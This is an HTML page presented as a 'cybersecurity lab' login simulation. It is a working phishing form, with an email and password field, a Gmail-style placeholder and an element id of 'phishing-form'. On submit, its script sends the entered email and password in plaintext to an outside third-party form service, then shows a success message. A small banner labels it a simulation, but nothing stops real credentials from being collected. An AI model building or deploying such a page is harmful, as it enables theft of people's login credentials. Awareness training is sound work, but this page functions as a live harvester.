<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Woyesa Cybersecurity Lab - Login Simulation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }
        h2 { color: #333; margin-bottom: 20px; }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label { display: block; margin-bottom: 5px; color: #666; font-size: 14px; }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover { background-color: #0056b3; }
        .warning-text {
            margin-top: 15px;
            color: red;
            font-size: 12px;
            font-weight: bold;
        }
        .alert-success {
            display: none;
            color: #28a745;
            font-weight: bold;
            margin-top: 15px;
        }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Woyesa Cybersecurity Lab</h2>
    <p style="font-size: 14px; color: #555;">Please sign in to continue.</p>
    
    <form id="phishing-form">
        <div class="input-group">
            <label>Email Address</label>
            <input type="email" id="email" placeholder="example@gmail.com" required>
        </div>
        <div class="input-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="Enter your password" required>
        </div>
        <button type="submit">Sign In</button>
    </form>

    <div id="success-msg" class="alert-success">
        ⚠️ Simulation complete! Data sent to lab environment securely.
    </div>

    <div class="warning-text">
        ⚠️ LAB SIMULATION ONLY: This is a cyber security awareness environment. Do not use real credentials.
    </div>
</div>

<script>
document.getElementById('phishing-form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    var emailData = document.getElementById('email').value;
    var passwordData = document.getElementById('password').value;
    
    // AJAX fayyadamnee FormBold-f ergaa jirra (Fuulli akka hin dogoggorreef)
    fetch("https://formbold.com", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: new URLSearchParams({
            "email": emailData,
            "password": passwordData
        })
    })
    .then(response => {
        // Erga dhufee booda unka dhoksina, ergaa milkaa'inaa argisiisna
        document.getElementById('phishing-form').style.display = 'none';
        document.getElementById('success-msg').style.display = 'block';
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
</script>

</body>
</html>
